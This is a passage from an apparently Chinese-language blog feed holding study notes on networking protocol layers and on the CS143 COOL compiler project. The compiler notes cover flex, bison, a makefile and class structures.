title="分层体系结构"></a>分层体系结构</h4><ul><li>优点：<ul><li>易于服务实现的多样性,因为某一层对其上一层提供服务，同时它可以利用下一层提供的服务，只要对上提供的服务和对下利用的服务没有变化，其层内部的实现并不会对系统结构产生影响，也就是对于大而复杂且需要不断更新的系统来说 改变服务的实现而不会影响系统其他组件。 </li><li>不用关注下一层如何实现，以及处理故障的细节。</li><li>协议分层具有<strong>概念化和结构化</strong>：<strong>使得模块化使更新系统组件更为容易</strong>。</li></ul></li><li>缺点：<ul><li><strong>功能上的冗余，</strong> 比如许多协议栈针对链路和端到端两种情况都提供了<strong>差错恢复功能</strong></li><li><strong>某层的功能可能需要仅在其它层才能出现的信息，这违反了层次分离的目标</strong></li></ul></li><li>总体来说，将各层的所有协议组合起来，称为协议栈。因特网的协议栈有5个层次组成：物理层、链路层、网络成、传输层、应用层。<ul><li><strong>应用层：</strong> 应用层协议分布在<strong>多个端系统</strong>，端系统中的<strong>应用程序使用该协议与另一个端系统中的应用程序</strong>通信。处于应用层的<strong>分组</strong>称为<strong>报文。</strong></li><li><strong>传输层：</strong> 传输层在应用程序<strong>端点</strong>之间传输应用层报文，因特网中有两个传输层协议：==TCP和UDP==。处于传输层的分组称为<strong>报文段</strong>。TCP提供确保传递、流量控制、拥塞控制机制。UDP提供<strong>无连接</strong>服务，即<strong>不提供不必要服务的服务</strong>, 没有可靠性、没有流量和拥塞控制。</li><li><strong>网络层：</strong> 网络层将称为<strong>数据报</strong>的网络层分组<strong>从一台主机移动到另一台主机</strong>。网络层协议包含著名的IP协议以及其他一些路由选择协议。</li><li><strong>链路层：</strong> 链路层将称为<strong>帧</strong>的链路层分组<strong>从一个结点移动到路径上的另一个结点</strong>。一个帧可能被沿途不同链路上的不同链路层协议处理。</li><li><strong>物理层：</strong> 物理层的任务是将<strong>帧中的比特从一个结点移动到 下一个节点</strong>，它提供了传输信息的实际物理通道；</li></ul></li><li>OSI模型：<ul><li>在<strong>因特网协议栈</strong>出现以前，<strong>OSI模型</strong>是ISO（国际标准化组织）组织研发的计算机网络结构模型。</li><li>OSI的模型一共有7层；</li><li>从下到上依次为：<strong>物理层，链路层，网络层，传输层，会话层，表示层，应用层</strong>。相比因特网体系结构，OSI多了两层。</li><li><strong>因特网</strong>将两层 <strong>（会话层，表示层）</strong> 的功能留给了<strong>开发者自行实现</strong>。</li></ul></li></ul><h4 id="封装："><a href="#封装：" class="headerlink" title="封装："></a>封装：</h4><ul><li>一个分组，在不同的层次有不同的称谓，是因为它们<strong>经过每一层（自上至下）的时候就被该层封装上了属于该层的相关信息</strong>，也就是前面提到的 <strong>（分组中的）必要信息</strong> ；于是，每一分层的分组有<strong>两种类型的字段</strong>：<strong>首部字段和有效负载</strong>；其中<strong>有效负载即为来自上一层的分组数据</strong>，而<strong>首部字段就是该层加上的必要信息</strong>；分组<strong>不断被封装（也就是不断地加首部字段，也就是必要信息）</strong> 以实现各层协议规定的相关功能。</li></ul><h3 id="Networks-Under-Attack"><a href="#Networks-Under-Attack" class="headerlink" title="Networks Under Attack"></a>Networks Under Attack</h3><ul><li>The Bad Guys Can Put Malware into Your Host Via the Internet</li><li>The Bad Guys Can Attack Servers and Network Infrastructure</li><li>The Bad Guys Can Sniff Packets</li><li>The Bad Guys Can Masquerade as Someone You Trust</li></ul><p>We should seek defenses against sniffing, end-point masquerading, man-in-the-middle attacks, DDoS attacks, malware, and more.</p><h2 id="第二章-应用层"><a href="#第二章-应用层" class="headerlink" title="第二章:应用层"></a>第二章:应用层</h2><blockquote><p>还是自己做思维导图吧, 真像以前那样子做的话笔记会详细的过于恐怖了.</p><p>书上是从零开始引导式的, 所以会比较详细.</p><p>(我特么真能写, 真的好多, 不过复习起来也挺爽的)</p></blockquote><p><img src="../../image/Computer_Networking/Computer_Networks.png" alt="Computer_Networks"></p><h2 id="第三章"><a href="#第三章" class="headerlink" title="第三章"></a>第三章</h2><p><img src="../../image/Computer_Networking/Chapter3.png" alt="Chapter3"></p><h2 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h2><p><img src="../../image/Computer_Networking/Chapter4.png" alt="Chapter4"></p><h2 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h2><p><img src="../../image/Computer_Networking/Chapter5.png" alt="Chapter5"></p><h2 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h2><p><img src="../../image/Computer_Networking/Chapter6.png" alt="Chapter6"></p><h2 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h2><p><img src="../../image/Computer_Networking/Chapter7.png" alt="Chapter7"></p><h2 id="第八章"><a href="#第八章" class="headerlink" title="第八章"></a>第八章</h2><p><img src="../../image/Computer_Networking/Chapter8.png" alt="Chapter8"></p>]]></content>
    
    
    <categories>
      
      <category>CS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>编译原理complier</title>
    <link href="/2021-10/Archive-complier/"/>
    <url>/2021-10/Archive-complier/</url>
    
    <content type="html"><![CDATA[<h1 id="COMPLIER-CS143"><a href="#COMPLIER-CS143" class="headerlink" title="COMPLIER-CS143"></a>COMPLIER-CS143</h1><p>这篇文章所用到的代码结构其实复杂了一些, 看到个其他的解法</p><h2 id="0-预备知识"><a href="#0-预备知识" class="headerlink" title="0. 预备知识"></a>0. 预备知识</h2><h3 id="COOL语言"><a href="#COOL语言" class="headerlink" title="COOL语言"></a>COOL语言</h3><ul><li>只能说是比较复杂, manuals和源码分析详见相关文档</li><li>比较典型的是继承树结构</li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">          &#123; -&gt; [String]<br>          &#123; -&gt; [Int]<br>[OBJECT] =&#123; -&gt; [IO]     -&gt; [B]<br>          &#123; -&gt; [Bool]<br>          &#123; -&gt; [A]<br></code></pre></div></td></tr></table></figure><h3 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h3><ul><li>词法分析-&gt;语法分析-&gt;语义分析</li><li><img src="https://i.loli.net/2021/11/15/AlBoJu85kTGY1FX.png" alt="image-20211013100444035" style="zoom:67%;" /> </li><li><strong>词法分析</strong> <ul><li>从左向右逐行扫描源程序的字符，识别出各个单词，确定单词的类型。将识别出的单词转换成统一的机内表示——词法单元(<strong>token</strong>)形式</li></ul></li><li><strong>语法分析</strong> <ul><li>语法分析器(parser)从词法分析器输出的token序列中识别出各类短语，并构造语法分析树(<strong>parse tree</strong>)</li></ul></li><li><strong>语义分析</strong> <ul><li>收集标识符的属性信息&amp;&amp;语义检查</li></ul></li><li><strong>中间代码</strong> <ul><li>三地址码 (Three-address Code)<div class="hljs code-wrapper"><pre><code>三地址码由类似于汇编语言的指令序列组成，每个指令最多有三个操作数(operand)</code></pre></div></li><li>语法结构树/语法树 (Syntax Trees)</li></ul></li></ul><h3 id="CS143实验文件结构"><a href="#CS143实验文件结构" class="headerlink" title="CS143实验文件结构"></a>CS143实验文件结构</h3><h4 id="list-h"><a href="#list-h" class="headerlink" title="list.h:"></a>list.h:</h4><ul><li>注意到head是这个节点存储的数据, 而tail指向下一个节点, 构造节点时在这一串链表的头部添加新的节点. </li></ul><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span>&gt;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">List</span> &#123;</span><br><span class="hljs-keyword">private</span>:<br>  T *head;<br>  List&lt;T&gt;* tail;<br><span class="hljs-keyword">public</span>:<br>  <span class="hljs-built_in">List</span>(T *h,List&lt;T&gt;* t = <span class="hljs-literal">NULL</span>): <span class="hljs-built_in">head</span>(h), <span class="hljs-built_in">tail</span>(t) &#123; &#125;<br><br>  <span class="hljs-function">T *<span class="hljs-title">hd</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span>       </span>&#123; <span class="hljs-keyword">return</span> head; &#125;  <br>  <span class="hljs-function">List&lt;T&gt;* <span class="hljs-title">tl</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123; <span class="hljs-keyword">return</span> tail; &#125;<br>&#125;;<br></code></pre></div></td></tr></table></figure><h4 id="tree-h-cool-tree-h"><a href="#tree-h-cool-tree-h" class="headerlink" title="tree.h+cool-tree.h:"></a>tree.h+cool-tree.h:</h4><ul><li>All APS nodes are derived from tree_node.</li><li>Lists of APS objects are implemented by the “list_node” template.</li><li>Class_, Feature, Expression等等都是指向constructor(第二层)的指针. 前者是因为Class是c++关键字, 所以加上一个下划线.</li><li>属实很抽象, 我觉得三层结构的原因是为了把第二层作成一个通用class, 因为全是**<u>纯虚</u>**函数. 就像Feature那样. 确实是这样, 在把class method加入env的method_table中时只要给出Features指针(<code>typedef Feature_class* Feature</code>)然后调用feature_add函数即可分配到method或者attr的add函数, 整了一个多态. </li></ul><pre><code class=" mermaid">classDiagramclass tree_node&#123;    int line_number       tree_node()    virtual tree_node *copy() = 0    virtual void dump(ostream&amp; stream, int n) = 0    int get_line_number()    tree_node *set(tree_node *)&#125;class list_node&#123;实现了三个返回下标的迭代器&#125;class node相关&#123;append_nodenil_nodesingle_list_node&#125;tree_node --|&gt; list_nodelist_node --|&gt; node相关class Class__class&#123;    virtual__get_name()    virtual__get_parent()    virtual__get_features()    virtual__get_filename()    virtual__dump_with_types(ostream&amp;,int)&#125;Class__class : define simple_phylum_Class_class class__class&#123;   Symbol name;   Symbol parent;   Features features;   Symbol filename;&#125;Class__class --|&gt; class__classtree_node --|&gt; Class__classtree_node --|&gt; Feature_classclass Feature_class&#123;全为纯虚函数:dump_with_types(ostream&amp;,int) = 0Symbol get_name()tc(EnvironmentP)add_to_table(EnvironmentP)&#125;class method_class&#123;    Symbol name;    Formals formals;    Symbol return_type;    Expression expr;    get_return_type()    get_formals()    ...&#125;class attr_class&#123;   Symbol name;   Symbol type_decl;   Expression init;&#125;Feature_class --|&gt; method_classFeature_class --|&gt; attr_classtree_node --|&gt; Formal_classtree_node --|&gt; Case_classtree_node --|&gt; Expression_class</code></pre><h4 id="stringtable"><a href="#stringtable" class="headerlink" title="stringtable:"></a>stringtable:</h4><ul><li>Symbol是指向<strong>Entry</strong>的指针 <code>typedef Entry* Symbol;</code> </li></ul><pre><code class=" mermaid">classDiagramdirection RLclass Entry&#123;  char *str;      int  len;     int index;&#125;Entry --|&gt; StringEntryEntry --|&gt; IntEntryEntry --|&gt; IdEntryclass StringTable~Elem~&#123;   List~Elem~ *tbl;   int index;&#125;StringTable .. Entry</code></pre><h2 id="1-lexer-词法分析"><a href="#1-lexer-词法分析" class="headerlink" title="1. lexer - 词法分析"></a>1. lexer - 词法分析</h2><ul><li>这一实验看上去就是逐字分析然后根据flex的语法返回token就完事了, 但要知道的是flex的内部原理仍然是有穷自动机finite automate, 具体概念可以看看课程PDF, flex的代码分析可见 <a href="https://github.com/pcy190/CompilerAnalysis/blob/master/flex_analysis.md">这里</a>, 肖哥的分析在 <a href="https://github.com/Kiprey/Skr_Learning/tree/master/week3-6#1-lexer---%E8%AF%8D%E6%B3%95%E5%88%86%E6%9E%90">这里</a> </li><li>字符串用到了stringtable. 具体见cool文档: We provide you with a string table implementation, which is discussed in detail in A Tour of the Cool<br>Support Code and in documentation in the code. For the moment, you only need to know that the type of string table entries is Symbol.</li></ul><p>flex <a href="https://ftp.gnu.org/old-gnu/Manuals/flex-2.5.4/html_mono/flex.html">document</a> </p><ul><li><code>yylex()</code>是<a href="https://ftp.gnu.org/old-gnu/Manuals/flex-2.5.4/html_mono/flex.html#SEC10">扫描例程</a>. </li><li>Actions中<code>yyless()</code> and <code>yymore()</code>可以把yytext的字符放到或者取出自input stream中. </li><li><code>#define yylval cool_yylval</code>: 返回semantic value.</li><li><a href="https://ftp.gnu.org/old-gnu/Manuals/flex-2.5.4/html_mono/flex.html#SEC10:~:text=Start%20conditions%20are%20declared%20in%20the%20definitions%20(first)%20section">Start conditions</a>: 这个就是匹配成对注释符的条件. <code>&lt;QUOTE_COMMENT&gt;&quot;*)&quot;         &#123; ... &#125;</code> <ul><li><code>%x QUOTE_COMMENT</code>: <em>exclusive</em>声明.  If it is <em>exclusive</em>, then <em>only</em> rules qualified with the start condition will be active. </li><li><code>BEGIN(INITIAL);</code>: `BEGIN(0/INITIAL)’ returns to the original state where only the rules with no start conditions are active. </li></ul></li></ul><p>文件:</p><ul><li>lexertest.cc是main函数所在文件, 我们写完cool.flex后flex使用此文件和众多依赖文件编译成lexer(executable)<ul><li>开头一个handle_flags函数处理命令行参数. 具体见文件. </li><li>调用cool_yylex来每次得到一个token, 然后dump打印出来. </li></ul></li><li>cool-lex.cc即为flex自动生成的词法扫描自动机</li><li>include中的cool-parser.h是一些宏定义, 比如token type.</li></ul><h2 id="2-parser-语法分析"><a href="#2-parser-语法分析" class="headerlink" title="2.parser - 语法分析"></a>2.parser - 语法分析</h2><ul><li>此阶段主要任务是构建AST树</li><li>文件关系:<ul><li>parser-phase.cc是main函数所在文件, 调用cool_yyparse函数</li><li>把词法分析编译出的lexer文件放进此PA的文件夹中完成词法分析</li><li>cool.y为我们要编写的bison文件, cool-parse.cc为bison自动生成的源文件, parser为可执行文件</li><li><code>assignments/PA3/cool-tree.handcode.h</code>: 这个真是手写的, 定义了每个class中extra的部分, 使用宏来支持自定义, 在之后的assignment中会加入更多的东西. </li></ul></li><li>If no parent is specified, the class inherits from the Object class. </li></ul><h3 id="make相关"><a href="#make相关" class="headerlink" title="make相关"></a>make相关</h3><ul><li>这make文件中还出现了<code>ln -s</code>命令, 居然只是用来将src或者include文件夹中的源文件复制到当前文件夹下, 真的是有点意义不明. </li><li><code>.d</code><a href="https://www.gnu.org/software/make/manual/html_node/Automatic-Prerequisites.html">文件doc</a> : 为了不用手动更改一个.cc文件的header file prerequisites, 可以先通过编译器自动生成该文件的依赖, 把.d文件名也放到target部分, 输出到.d文件中, 再使用<code>-include</code>加入到makefile中. </li><li><code>-include filenames…</code>: This acts like <code>include</code> in every way except that there is no error (not even a warning) if any of the filenames (or any prerequisites of any of the filenames) do not exist or cannot be remade.</li><li></li></ul><figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">ASSN = 3<br>CLASS= cs143<br>CLASSDIR= ../..<br>LIB= -lfl <span class="hljs-comment">#意义不明的flag</span><br>AR= gar<br>ARCHIVE_NEW= -cr<br>RANLIB= gar -qs<br><br>SRC= cool.y cool-tree.handcode.h good.cl bad.cl README<br>CSRC= parser-phase.cc utilities.cc stringtab.cc dumptype.cc \<br>      tree.cc cool-tree.cc tokens-lex.cc  handle_flags.cc <br>TSRC= myparser mycoolc cool-tree.aps <span class="hljs-comment">#这个aps完全都没有用到啊. 确实用不到</span><br>CGEN= cool-parse.cc<br>HGEN= cool-parse.h<br>LIBS= lexer semant cgen<br>CFIL= $&#123;CSRC&#125; $&#123;CGEN&#125;<br>HFIL= cool-tree.h cool-tree.handcode.h <br>LSRC= Makefile<br>OBJS= $&#123;CFIL:.cc=.o&#125; <span class="hljs-comment">#make的字符串替换函数</span><br>OUTPUT= good.output bad.output<br><br><br>CPPINCLUDE= -I. -I$&#123;CLASSDIR&#125;/<span class="hljs-keyword">include</span>/PA$&#123;ASSN&#125; -I$&#123;CLASSDIR&#125;/src/PA$&#123;ASSN&#125;<br><br>BFLAGS = -d -v -y -b cool --debug -p cool_yy<br><br>CC=g++<br>CFLAGS=-g -Wall -Wno-unused -Wno-deprecated  -Wno-write-strings -DDEBUG $&#123;CPPINCLUDE&#125;<br>FLEX=flex $&#123;FFLAGS&#125;<br>BISON= bison $&#123;BFLAGS&#125;<br>DEPEND = $&#123;CC&#125; -MM $&#123;CPPINCLUDE&#125;<br><br><span class="hljs-section">source: $&#123;SRC&#125; $&#123;TSRC&#125; $&#123;LIBS&#125; lsource</span><br><span class="hljs-section">lsource: $&#123;LSRC&#125;</span><br><span class="hljs-section">$&#123;OUTPUT&#125;:parser good.cl bad.cl</span><br>@rm -f $&#123;OUTPUT&#125;<br>./myparser good.cl &gt;good.output 2&gt;&amp;1 <br>-./myparser bad.cl &gt;bad.output 2&gt;&amp;1 <br><span class="hljs-section">parser: $&#123;OBJS&#125;</span><br>$&#123;CC&#125; $&#123;CFLAGS&#125; $&#123;OBJS&#125; $&#123;LIB&#125; -o parser<br><span class="hljs-section">.cc.o:</span><br>$&#123;CC&#125; $&#123;CFLAGS&#125; -c <span class="hljs-variable">$&lt;</span><br><span class="hljs-comment">#使用bison的证据. 但是重命名了一下, 当前文件夹中还有一个cool.tab.h头文件.</span><br>cool-parse.cc cool-parse.h: cool.y<br>bison $&#123;BFLAGS&#125; cool.y<br>mv -f cool.tab.c cool-parse.cc<br><span class="hljs-comment">#myparser中使用了lexer, 要先来一个</span><br><span class="hljs-section">dotest:parser good.cl bad.cl</span><br>@echo <span class="hljs-string">&quot;\nRunning parser on good.cl\n&quot;</span><br>-./myparser good.cl <br>@echo <span class="hljs-string">&quot;\nRunning parser on bad.cl\n&quot;</span><br>-./myparser bad.cl<br><br><span class="hljs-section">$&#123;LIBS&#125;:</span><br>$&#123;CLASSDIR&#125;/etc/link-object $&#123;ASSN&#125; <span class="hljs-variable">$@</span><br><span class="hljs-comment">#神奇的符号链接, 把这些源文件都链接到当前文件夹下, 不知道有什么作用. </span><br>$&#123;TSRC&#125; $&#123;CSRC&#125;:<br>-ln -s $&#123;CLASSDIR&#125;/src/PA$&#123;ASSN&#125;/<span class="hljs-variable">$@</span> <span class="hljs-variable">$@</span><br><span class="hljs-section">$&#123;HSRC&#125;:</span><br>-ln -s $&#123;CLASSDIR&#125;/<span class="hljs-keyword">include</span>/PA$&#123;ASSN&#125;/<span class="hljs-variable">$@</span> <span class="hljs-variable">$@</span><br><br>clean :<br>-rm -f $&#123;OUTPUT&#125; *.s core $&#123;OBJS&#125; $&#123;CGEN&#125; $&#123;HGEN&#125; lexer parser cgen semant *~ *.a *.o <br><br><span class="hljs-section">clean-compile:</span><br>@-rm -f core $&#123;OBJS&#125; $&#123;CGEN&#125; $&#123;HGEN&#125; $&#123;LSRC&#125;<br><br><span class="hljs-section">%.d: %.cc $&#123;LSRC&#125;</span><br>$&#123;SHELL&#125; -ec &#x27;$&#123;DEPEND&#125; <span class="hljs-variable">$&lt;</span> | sed &#x27;\&#x27;&#x27;s/\(<span class="hljs-variable">$*</span>\.o\)[ :]*/\1 <span class="hljs-variable">$@</span> : /g&#x27;\&#x27;&#x27; &gt; <span class="hljs-variable">$@</span>&#x27;<br><br><span class="hljs-keyword">-include</span> $&#123;CFIL:.cc=.d&#125;<br></code></pre></div></td></tr></table></figure><h3 id="bison"><a href="#bison" class="headerlink" title="bison:"></a>bison:</h3><ul><li><p><a href="https://web.archive.org/web/20210621041953/https://happyers.top/compiler/bison-parser/">生成代码分析</a> | <a href="https://www.cs.uic.edu/~spopuri/cparser.html">英文</a> | <a href="https://www.gnu.org/software/bison/manual/bison.html">文档</a> </p></li><li><p><code>bison</code>所使用的是自底向上，左递归的分析方式。</p></li><li><p>在语法分析这个过程中，可以过滤出一些不符合语法的错误，例如token排列不符合条件，无法规约。<br>在这种情况下必须进行错误处理程序，将token弹出栈（或者其他操作）。</p></li><li><p>一个简单的例子</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">%<span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>...<br>    Class_ class_;<br>&#125;<br><br>%type &lt;class_&gt; <span class="hljs-class"><span class="hljs-keyword">class</span></span><br><span class="hljs-class"></span><br><span class="hljs-class">/* <span class="hljs-title">If</span> <span class="hljs-title">no</span> <span class="hljs-title">parent</span> <span class="hljs-title">is</span> <span class="hljs-title">specified</span>, <span class="hljs-title">the</span> <span class="hljs-keyword">class</span> <span class="hljs-title">inherits</span> <span class="hljs-title">from</span> <span class="hljs-title">the</span> <span class="hljs-title">Object</span> <span class="hljs-title">class</span>. */</span><br><span class="hljs-class">/* 定义：以下<span class="hljs-title">token</span>规约后的符号名称为&quot;<span class="hljs-keyword">class</span>&quot; */</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> :</span><br>  <span class="hljs-comment">/* 若当前栈中的token满足下面这条式子 */</span><br>  CLASS TYPEID <span class="hljs-string">&#x27;&#123;&#x27;</span> dummy_feature_list <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-string">&#x27;;&#x27;</span> <span class="hljs-comment">/* &#x27; */</span><br>    <span class="hljs-comment">/* 进行规约。在规约的同时执行以下这条式子 */</span><br>    <span class="hljs-comment">/* 注意，赋给$$的值，就是规约后新生成&quot;class&quot;的值 */</span><br>    &#123; $$ = <span class="hljs-built_in">class_</span>($<span class="hljs-number">2</span>,idtable.<span class="hljs-built_in">add_string</span>(<span class="hljs-string">&quot;Object&quot;</span>), $<span class="hljs-number">4</span>, stringtable.<span class="hljs-built_in">add_string</span>(curr_filename)); &#125;<br>  | <span class="hljs-comment">/* 或者，如果满足以下式子 */</span><br>  CLASS TYPEID INHERITS TYPEID <span class="hljs-string">&#x27;&#123;&#x27;</span> dummy_feature_list <span class="hljs-string">&#x27;&#125;&#x27;</span> <span class="hljs-string">&#x27;;&#x27;</span><br>    &#123; $$ = <span class="hljs-built_in">class_</span>($<span class="hljs-number">2</span>,$<span class="hljs-number">4</span>,$<span class="hljs-number">6</span>,stringtable.<span class="hljs-built_in">add_string</span>(curr_filename)); &#125;<br>  | <span class="hljs-comment">/* 或者，如果捕获到了错误 */</span><br>  error <span class="hljs-string">&#x27;;&#x27;</span><br>    &#123;&#125;<br>;<br></code></pre></div></td></tr></table></figure></li></ul><h3 id="语法点"><a href="#语法点" class="headerlink" title="语法点"></a>语法点</h3><ul><li><p>You must declare bison “types” for your non-terminals and terminals that have attributes. <code>%type &lt;program&gt; program</code> This declaration says that the non-terminal program has <strong><u>type</u></strong> <code>&lt;program&gt;</code>. The use of the word “type” is misleading here; what it really means is that the <strong>attribute</strong> for the non-terminal program is stored in the program member of the <strong>union</strong> declaration in cool.y, which has type Program. By specifying the type<br><code>%type &lt;member_name&gt; X Y Z ...</code><br>you instruct bison that the attributes of non-terminals (or terminals) X, Y, and Z have a type appropriate for the member member name of the union.</p></li><li><p>All the union members and their types have similar names by design. It is a coincidence in the example above that the non-terminal program has the same name as a union member.</p></li><li><p>APS: 在cool_tour.pdf里</p><ul><li>The Cool abstract syntax is specified in a language called APS</li><li>Phyla are really just <strong>types</strong>. That is, instead of having one large group of undifferentiated constructors, the constructors are grouped together <strong>according to function</strong>, 这个意思应该<strong>根据功能</strong>. </li><li>the various kinds of abstract syntax tree nodes (let, +, etc.) are called <strong>constructors</strong>.</li><li>Each <strong>constructor</strong> takes <strong>typed</strong> arguments and returns a <strong>typed</strong> result. The types may either be phyla or any ordinary C++ type.</li><li>In fact, the <strong>phyla</strong> declarations are themselves compiled into <strong>C++ class declarations</strong> by an <strong>APS compiler</strong>.</li><li>我没搞清楚aps在哪里被用到了, 还有什么是aps compiler. 不会是自创的吧. <strong>我居然找到一个aps2c++</strong>. 可惜没有什么注释可看. </li><li><strong><u><em>重大发现</em></u></strong> : bin文件夹下有个aps2c++, 可以将aps文件转化为<code>cool-tree.cc</code>和<code>cool-tree.h</code>文件, 其中的class成员函数都有. 应该是默认生成的. 果然是自创的吧. 在初始文件中已经转化过了, 所以也不用太在意.<ul><li>在aps文件中定义的constructor在cool.y中被使用. The <code>class</code> constructor returns an AST of type (or phylum) <code>Class_</code>.</li><li>基本同上: cool-tree.h结尾处定义了在cool.y里用到的constructor, 实际上返回的是对应的class构造函数. 比如<code>class__class()</code> <code>method_class()</code>等等.</li></ul></li><li>真的是太多了. 哪里看的过来.</li></ul></li><li><p>a terminal (<code>CLASS</code>), a non-terminal (<code>class</code>), a constructor (<code>class_</code>), and a phylum (<code>Class_</code>). </p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">typedef</span> Class__class *Class_;<br><span class="hljs-function">Class_ <span class="hljs-title">class__class::copy_Class_</span><span class="hljs-params">()</span></span>&#123;   <br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">class__class</span>(<span class="hljs-built_in">copy_Symbol</span>(name), <span class="hljs-built_in">copy_Symbol</span>(parent), features-&gt;<span class="hljs-built_in">copy_list</span>(), <span class="hljs-built_in">copy_Symbol</span>(filename)); &#125;<br></code></pre></div></td></tr></table></figure></li><li><p><strong>反正bison只管推导, 至于分析出结果之后用什么结构存储管理就是我们在定义的部分和其他文件里所写的那样</strong>. </p></li><li><p>如果要看更多可能要分析bison的输出文件, 暂时不看了. 接下来是语义分析. </p></li></ul><h2 id="3-semantic-语义分析"><a href="#3-semantic-语义分析" class="headerlink" title="3.semantic - 语义分析"></a>3.semantic - 语义分析</h2><ol><li>Look at all classes and build an inheritance graph.</li><li>Check that the graph is well-formed.</li><li>For each class<br>(a) Traverse the AST, gathering all visible declarations in a symbol table.<br>(b) Check each expression for type correctness.<br>(c) Annotate the AST with types.</li></ol><ul><li>semant.h结构如下</li><li>注意到symboltable中有三个typedef, 其中SymtabEntry里存储了id和info.<br>tbl指向当前的最里面一层的scope, 当然他是一个list, 可以通过<code>tl()</code>继续找到上一层scope的list节点. </li><li>InheritanceNode就是在class_class的基础之上添加了父子类的指针, 还有reachability basic_status+env这些信息. 因为很明显需要存储该类的所有子类以便于继承树检查. </li><li>而ClassTable以InheritanceNode的形式存储了所有的class, 文件中所有class检查完之后进入ClassTable的构造函数, 调用private functions例如install_class, build_inheritance_tree等来分析判断继承树的合法性. </li><li>创建这三个class的目的也很明显, 语法分析得到的无语法错误的AST树节点由<code>Program_class</code>一类class组成, 但是节点能够存储的信息不够用于继承树和类型检查, 所以在class的基础上添加一些信息继承出InheritanceNode, 再由ClassTable管理, 最终所有的method class var都由一个最大的Environment class管理. </li></ul><pre><code class=" mermaid">classDiagramclass InheritanceNodeclass ClassTable&#123;   -List&lt;InheritanceNode&gt; *nds   -install_class()   -check_improper_inheritance()   -build_inheritance_tree()   some_other_funcs()&#125;class SymbolTable~Symbol, InheritanceNode~&#123;   typedef SymtabEntry&lt;SYM,DAT&gt; ScopeEntry;   typedef List&lt;ScopeEntry&gt; Scope;   typedef List&lt;Scope&gt; ScopeList;   -ScopeList *tbl;   +enterscope() void   +exitscope() void   +addid() ScopeEntry*   +lookup() DAT*   +probe() DAT*   +dump() void&#125;InheritanceNode &lt;|-- class__class : InheritanceClassTable &lt;|-- SymbolTable~Symbol, InheritanceNode~ : Inheritanceclass Environment&#123;    -SymbolTable~Symbol, method_class~ method_table;    -SymbolTable~Symbol, Entry~  var_table;    -ClassTableP class_table;    -Class_      self_class;    method表操作函数    variable表操作函数    type操作函数get_self_type等等&#125;InheritanceNode : 